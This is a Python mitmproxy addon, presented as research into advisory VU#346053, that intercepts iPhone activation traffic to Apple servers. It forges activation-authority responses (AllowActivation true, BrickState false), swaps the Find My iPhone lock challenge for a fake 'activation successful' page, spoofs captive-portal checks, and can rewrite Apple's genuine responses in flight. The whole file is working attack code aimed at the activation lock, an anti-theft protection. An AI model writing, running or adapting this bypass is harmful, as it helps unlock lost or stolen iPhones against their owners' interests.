"""
mitmproxy addon for VU#346053 BAA injection research.

Intercepts Apple activation endpoints and either:
  - Logs what the device sends (passive mode)
  - Injects crafted BAA/XMLUI responses (active mode)
  - Proxies to real Apple, modifies response in-flight (hybrid mode)

Usage with mitmdump:
    sudo mitmdump --mode transparent --listen-port 8080 \
        --ssl-insecure -s server/mitm_baa_addon.py \
        --set mode=inject

Modes:
    log     - Just log all traffic, forward everything
    inject  - Intercept BAA/activation endpoints, inject our payloads
    hybrid  - Forward to real Apple, modify BAA fields in response
"""

import os
import sys
import json
import time
import plistlib
import logging
import subprocess
from datetime import datetime
from mitmproxy import http, ctx

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
RESULTS_DIR = os.path.join(SCRIPT_DIR, "baa_inject_results")
CAPTURES_DIR = os.path.join(SCRIPT_DIR, "captures", "mitm")
os.makedirs(RESULTS_DIR, exist_ok=True)
os.makedirs(CAPTURES_DIR, exist_ok=True)

# Apple activation domains we care about
ACTIVATION_DOMAINS = {
    "albert.apple.com",
    "humb.apple.com",
    "gs.apple.com",
    "static.ips.apple.com",
    "mesu.apple.com",
    "static.deviceservices.apple.com",
    "captive.apple.com",
    "bag.itunes.apple.com",
    "setup.icloud.com",
    "gateway.icloud.com",
    "iprofiles.apple.com",
    "configuration.apple.com",
    "identity.apple.com",
    "gsa.apple.com",
    "gdmf.apple.com",
    "xp.apple.com",
}

# Resolve real Apple IPs so we can forward in hybrid mode
REAL_IPS = {}


def resolve_real_ip(domain):
    """Resolve via external DNS, cache result."""
    if domain in REAL_IPS:
        return REAL_IPS[domain]
    try:
        result = subprocess.run(
            ["dig", "+short", "@8.8.8.8", domain],
            capture_output=True, text=True, timeout=5
        )
        lines = [l.strip() for l in result.stdout.strip().split("\n")
                 if l.strip()]
        ips = [l for l in lines
               if all(c.isdigit() or c == '.' for c in l)]
        if ips:
            REAL_IPS[domain] = ips[0]
            return ips[0]
    except Exception:
        pass
    return None


def build_baa_response():
    """BAA response: AllowActivation=True, BrickState=False."""
    return plistlib.dumps({
        "ProtocolVersion": "2",
        "Status": "SUCCESS",
        "BAAResponse": {
            "AllowActivation": True,
            "BrickState": False,
            "GracePeriod": 0,
            "Message": "Device provisioning successful",
        },
    }, fmt=plistlib.FMT_XML)


def build_xmlui_bypass():
    """XMLUI bypass page replacing FMIPLockChallenge."""
    return (
        '<xmlui style="setupAssistant"><page name="ActivationSuccess">\n'
        '    <script>\n'
        '    <![CDATA[\n'
        '        function proceed() { return true; }\n'
        '    ]]>\n'
        '    </script>\n'
        '    <navigationBar title="iPhone" hidesBackButton="true" '
        'loadingTitle="Loading...">\n'
        '        <linkBarItem id="next" '
        'url="/deviceservices/deviceActivation" '
        'position="right" label="Continue" enabledFunction="proceed" '
        'httpMethod="POST" />\n'
        '    </navigationBar>\n'
        '    <tableView>\n'
        '    <section>\n'
        '        <footer>Your device has been activated.</footer>\n'
        '    </section>\n'
        '    </tableView>\n'
        '</page>\n'
        '</xmlui>'
    ).encode("utf-8")


_counter = 0
_log_entries = []


def save_flow(flow, label):
    """Save a flow's request+response for analysis."""
    global _counter
    _counter += 1
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    host = flow.request.host or "unknown"
    path = flow.request.path.strip("/").replace("/", "_") or "root"
    prefix = f"{ts}_{_counter:03d}_{label}_{host}_{path}"

    # Request
    req_file = os.path.join(CAPTURES_DIR, f"{prefix}_req.bin")
    with open(req_file, "wb") as f:
        f.write(flow.request.get_content() or b"")

    # Response (if present)
    resp_body = b""
    resp_code = 0
    if flow.response:
        resp_body = flow.response.get_content() or b""
        resp_code = flow.response.status_code

    resp_file = os.path.join(CAPTURES_DIR, f"{prefix}_resp.bin")
    with open(resp_file, "wb") as f:
        f.write(resp_body)

    meta = {
        "timestamp": ts,
        "label": label,
        "host": flow.request.host,
        "port": flow.request.port,
        "scheme": flow.request.scheme,
        "method": flow.request.method,
        "path": flow.request.path,
        "url": flow.request.url,
        "request_size": len(flow.request.get_content() or b""),
        "response_code": resp_code,
        "response_size": len(resp_body),
        "request_headers": dict(flow.request.headers),
        "response_headers": dict(flow.response.headers) if flow.response else {},
        "tls_established": flow.request.scheme == "https",
    }

    meta_file = os.path.join(CAPTURES_DIR, f"{prefix}_meta.json")
    with open(meta_file, "w") as f:
        json.dump(meta, f, indent=2, default=str)

    _log_entries.append(meta)
    return meta


class BAAInjector:
    """mitmproxy addon for BAA injection."""

    def __init__(self):
        self.mode = "inject"  # Default: inject payloads
        self.request_count = 0
        self.tls_errors = []

    def load(self, loader):
        loader.add_option(
            name="baa_mode",
            typespec=str,
            default="inject",
            help="Operation mode: log, inject, or hybrid",
        )

    def configure(self, updated):
        if "baa_mode" in updated:
            self.mode = ctx.options.baa_mode
            ctx.log.info(f"BAA addon mode: {self.mode}")

    def tls_start_client(self, data):
        """Log TLS start events (mitmproxy 10+)."""
        try:
            conn = data.context.client
            ctx.log.info(
                f"[TLS-START] client={conn.peername} "
                f"server={data.context.server.address if data.context.server else '?'}"
            )
        except Exception as e:
            ctx.log.info(f"[TLS-START] (details unavailable: {e})")

    def tls_failed_client(self, data):
        """Log TLS failures -- shows cert rejection."""
        try:
            conn = data.context.client
            client_str = str(conn.peername) if hasattr(conn, 'peername') else "unknown"
            server_addr = str(data.context.server.address) if data.context.server else "?"
            err_str = str(data.context.error) if hasattr(data.context, 'error') else "unknown"
        except Exception:
            client_str = "unknown"
            server_addr = "?"
            err_str = "unknown"

        ctx.log.warn(f"[TLS-FAIL] client={client_str} server={server_addr} error={err_str}")
        self.tls_errors.append({
            "time": datetime.now().isoformat(),
            "client": client_str,
            "server": server_addr,
            "error": err_str,
        })
        if len(self.tls_errors) % 5 == 0:
            err_file = os.path.join(
                CAPTURES_DIR,
                f"tls_errors_{datetime.now().strftime('%H%M%S')}.json"
            )
            with open(err_file, "w") as f:
                json.dump(self.tls_errors, f, indent=2)

    def request(self, flow: http.HTTPFlow):
        """Intercept requests."""
        self.request_count += 1
        host = flow.request.host or ""
        path = flow.request.path or ""
        method = flow.request.method
        client = flow.client_conn.peername

        ctx.log.info(
            f"[REQ #{self.request_count}] {method} "
            f"{flow.request.scheme}://{host}{path} "
            f"from {client}"
        )

        # Log ALL requests from the iPhone
        is_apple = any(d in host for d in ACTIVATION_DOMAINS) or \
                   "apple" in host.lower()
        if is_apple:
            ctx.log.info(f"  >> APPLE ENDPOINT: {host}{path}")

        # In inject mode, intercept specific endpoints
        if self.mode == "inject":
            self._handle_inject(flow, host, path)
        elif self.mode == "hybrid":
            # Let it flow through to Apple, we modify in response()
            pass
        # In log mode, do nothing (forward as-is)

    def _handle_inject(self, flow, host, path):
        """Inject BAA/XMLUI responses for known endpoints."""
        # BAA endpoint
        if "humb.apple.com" in host and "/humbug/baa" in path:
            ctx.log.info("  ** INJECTING BAA RESPONSE **")
            body = build_baa_response()
            flow.response = http.Response.make(
                200, body,
                {"Content-Type": "application/x-apple-plist"}
            )
            save_flow(flow, "baa_inject")
            return

        # DRM Handshake
        if "albert.apple.com" in host and "/drmHandshake" in path:
            ctx.log.info("  ** Logging drmHandshake request **")
            save_flow(flow, "drm_handshake_req")
            # Don't inject -- let it go to Apple for real handshake
            # (we need the real handshake for activation to proceed)
            return

        # Device Activation
        if "albert.apple.com" in host and "/deviceActivation" in path:
            ctx.log.info("  ** INJECTING XMLUI BYPASS **")
            body = build_xmlui_bypass()
            flow.response = http.Response.make(
                200, body,
                {"Content-Type": "application/x-buddyml"}
            )
            save_flow(flow, "xmlui_inject")
            return

        # Captive portal detection
        if "captive.apple.com" in host or \
           path in ("/hotspot-detect.html",
                    "/library/test/success.html"):
            ctx.log.info("  ** Captive portal -- returning non-Success **")
            flow.response = http.Response.make(
                200,
                b"<html><head><title>Connecting</title></head>"
                b"<body>Verifying.</body></html>",
                {"Content-Type": "text/html"}
            )
            return

    def response(self, flow: http.HTTPFlow):
        """Modify responses (used in hybrid mode)."""
        host = flow.request.host or ""
        path = flow.request.path or ""

        is_apple = any(d in host for d in ACTIVATION_DOMAINS) or \
                   "apple" in host.lower()

        if is_apple and flow.response:
            ctx.log.info(
                f"[RESP] {flow.request.scheme}://{host}{path} "
                f"-> HTTP {flow.response.status_code} "
                f"({len(flow.response.get_content() or b'')} bytes)"
            )
            save_flow(flow, "response")

            # In hybrid mode, modify Apple's real BAA response
            if self.mode == "hybrid":
                self._modify_apple_response(flow, host, path)

    def _modify_apple_response(self, flow, host, path):
        """Modify Apple's real response to inject BAA fields."""
        if "humb.apple.com" in host and "/humbug/baa" in path:
            try:
                body = flow.response.get_content()
                plist = plistlib.loads(body)
                ctx.log.info(
                    f"  >> Original BAA response keys: {list(plist.keys())}"
                )

                # Modify BAA fields
                if "BAAResponse" in plist:
                    plist["BAAResponse"]["AllowActivation"] = True
                    plist["BAAResponse"]["BrickState"] = False
                    plist["BAAResponse"]["GracePeriod"] = 0
                else:
                    plist["BAAResponse"] = {
                        "AllowActivation": True,
                        "BrickState": False,
                        "GracePeriod": 0,
                    }

                modified = plistlib.dumps(plist, fmt=plistlib.FMT_XML)
                flow.response.set_content(modified)
                ctx.log.info("  ** BAA RESPONSE MODIFIED (hybrid) **")
                save_flow(flow, "baa_hybrid_modified")
            except Exception as e:
                ctx.log.error(f"  >> Failed to modify BAA: {e}")

        elif "albert.apple.com" in host and "/deviceActivation" in path:
            ct = flow.response.headers.get("Content-Type", "")
            if "buddyml" in ct.lower():
                ctx.log.info(
                    "  >> Apple returned XMLUI/BuddyML -- replacing with bypass"
                )
                flow.response.set_content(build_xmlui_bypass())
                save_flow(flow, "xmlui_hybrid_replaced")

    def done(self):
        """Save summary on exit."""
        summary = {
            "mode": self.mode,
            "total_requests": self.request_count,
            "tls_errors": len(self.tls_errors),
            "captures": len(_log_entries),
            "entries": _log_entries[-50:],  # Last 50 entries
            "all_tls_errors": self.tls_errors,
        }
        out = os.path.join(
            CAPTURES_DIR,
            f"mitm_summary_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        )
        with open(out, "w") as f:
            json.dump(summary, f, indent=2, default=str)
        ctx.log.info(f"Summary saved: {out}")


addons = [BAAInjector()]
